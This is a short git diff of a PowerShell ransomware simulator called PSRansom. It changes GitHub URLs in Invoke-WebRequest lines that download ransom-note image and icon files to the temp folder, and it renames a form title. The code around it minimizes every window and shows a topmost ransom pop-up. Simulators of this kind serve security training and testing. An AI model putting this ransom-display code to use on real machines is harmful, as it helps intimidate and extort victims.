@@ -172,8 +172,8 @@ function PopUpRansom {
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
 
-Invoke-WebRequest -useb https://raw.githubusercontent.com/PhyoPaingHtun/RansomwareSimulator/tree/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
-Invoke-WebRequest -useb https://raw.githubusercontent.com/PhyoPaingHtun/RansomwareSimulator/tree/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
+Invoke-WebRequest -useb https://raw.githubusercontent.com/PhyoPaingHtun/Ransomware-Simulator/tree/main/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
+Invoke-WebRequest -useb https://raw.githubusercontent.com/PhyoPaingHtun/Ransomware-Simulator/tree/main/PSRansom.ico -Outfile $env:temp\PSRansom.ico
 $shell = New-Object -ComObject "Shell.Application"
 $shell.minimizeall()
 
@@ -186,7 +186,7 @@ $form.StartPosition = "CenterScreen"
 $form.WindowState = "Normal"
 $form.Topmost = $true
 $form.FormBorderStyle = "Fixed3D"
-$form.Text = "PSRansom by @PhyoPaingHtun - https://github.com/PhyoPaingHtun/RansomwareSimulator"
+$form.Text = "PSRansom by @PhyoPaingHtun - https://github.com/PhyoPaingHtun/Ransomware-Simulator"
 $formIcon = New-Object system.drawing.icon ("$env:temp\PSRansom.ico") 
 $form.Icon = $formicon  
 
